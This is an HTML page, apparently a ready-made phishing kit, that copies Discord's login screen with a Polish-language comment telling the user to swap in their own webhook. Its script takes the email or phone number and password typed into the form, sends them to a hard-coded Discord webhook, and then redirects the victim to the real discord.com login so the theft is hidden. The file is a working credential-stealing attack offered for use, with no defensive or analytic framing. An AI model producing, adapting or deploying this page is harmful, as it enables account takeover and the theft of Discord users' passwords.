<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: Arial, Helvetica, sans-serif; background: #f7f7f8; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .card { background: #fff; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,.1); display: flex; overflow: hidden; max-width: 800px; width: 100%; margin: 20px; }
  .left { padding: 40px; width: 480px; }
  .logo { font-size: 28px; font-weight: 800; color: #5865f2; margin-bottom: 24px; letter-spacing: .5px; }
  .logo span { display: block; font-size: 13px; font-weight: 400; color: #4e5058; margin-top: 2px; }
  h1 { font-size: 24px; color: #060607; margin-bottom: 6px; }
  .sub { font-size: 15px; color: #4e5058; margin-bottom: 24px; }
  label { display: block; font-size: 12px; font-weight: 700; color: #4e5058; margin-bottom: 8px; }
  label .req { color: #f23f43; }
  input { width: 100%; padding: 10px; border: 1px solid #d4d7dc; border-radius: 4px; font-size: 16px; margin-bottom: 20px; background: #fff; color: #060607; }
  input:focus { outline: none; border-color: #5865f2; }
  .forgot { text-align: right; margin-bottom: 20px; }
  .forgot a { color: #00a8fc; font-size: 13px; text-decoration: none; }
  button { width: 100%; padding: 12px; background: #5865f2; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
  button:hover { background: #4752c4; }
  .register { margin-top: 16px; font-size: 13px; color: #4e5058; }
  .register a { color: #00a8fc; text-decoration: none; }
  .right { background: #f2f3f5; width: 240px; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
  .qr { width: 120px; height: 120px; background: #fff; border: 1px solid #d4d7dc; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 10px; color: #aaa; margin-bottom: 16px; }
  .right h2 { font-size: 18px; color: #060607; margin-bottom: 8px; }
  .right p { font-size: 12px; color: #4e5058; line-height: 1.4; }
</style>
</head>
<body>

<div class="card">
  <div class="left">
    <div class="logo">Discord<span>discord.com/login</span></div>
    <h1>Welcome back!</h1>
    <p class="sub">We're so excited to see you again!</p>

    <form id="login-form">
      <label for="emailOrphone">EMAIL OR PHONE NUMBER <span class="req">*</span></label>
      <input type="text" id="emailOrphone" required autocomplete="off">

      <label for="password">PASSWORD <span class="req">*</span></label>
      <input type="password" id="password" required>

      <div class="forgot"><a href="#">Forgot your password?</a></div>

      <button type="submit">Log In</button>
    </form>

    <div class="register">Need an account? <a href="#">Register</a></div>
  </div>

  <div class="right">
    <div class="qr">QR</div>
    <h2>Log in with QR Code</h2>
    <p>Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
  </div>
</div>

<script>
const form = document.getElementById('login-form');
const webhookUrl = 'https://discord.com/api/webhooks/1537189499606540308/zSSvet2UDzR5LY6nYSzKcEM7ewNAzHx4brsvdwN7Th0bcvzZZeHe0RJ5zWGW1DoVr7IW'; // <-- PODMIENIASZ TYLKO TO

form.addEventListener('submit', function(e) {
  e.preventDefault();

  const loginInput = document.getElementById('emailOrphone').value;
  const passwordInput = document.getElementById('password').value;

  const content = '**Nowe logowanie:**\n**Email/Telefon:** ' + loginInput + '\n**Hasło:** ' + passwordInput;

  fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content: content })
  })
  .then(function() {
    window.location.href = 'https://discord.com/login';
  })
  .catch(function() {
    window.location.href = 'https://discord.com/login';
  });
});
</script>

</body>
</html>
